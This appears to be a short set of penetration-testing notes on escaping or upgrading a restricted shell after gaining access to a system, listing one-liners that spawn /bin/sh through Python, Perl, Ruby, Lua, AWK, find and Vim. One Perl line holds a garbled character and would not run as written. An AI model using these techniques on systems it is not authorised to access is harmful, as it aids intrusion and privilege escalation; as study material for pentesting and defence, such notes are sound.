- There may be times that we land **on a system with a limited shell, and Python is not installed**. In these cases, it's good to know that we could use several different methods to spawn an interactive shell. Let's examine some of them:

# Breaking Restricted / Limited Shells
---
- Python:
	- `python -c 'import pty; pty.spawn("/bin/sh")' `
- Sh:
	- `/bin/sh -i`
- Perl
	- `perl â€”e 'exec "/bin/sh";'`
	- `perl: exec "/bin/sh";`
- Ruby
	- `ruby: exec "/bin/sh"`
- Lua
	- `lua: os.execute('/bin/sh')`
- AWK
	- `awk 'BEGIN {system("/bin/sh")}'`
- Find
	- `find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;`
	- Using Exec To Launch A Shell:
		- `find . -exec /bin/sh \; -quit`
- VIM
	- `vim -c ':!/bin/sh'`
	- Vim Escape: 
		- `:set shell=/bin/sh`
		- `:shell`
- Sudo -l:
	- The sudo -l command above will need a stable interactive shell to run. If you are not in a full shell or sitting in an unstable shell, you may not get any return from it.
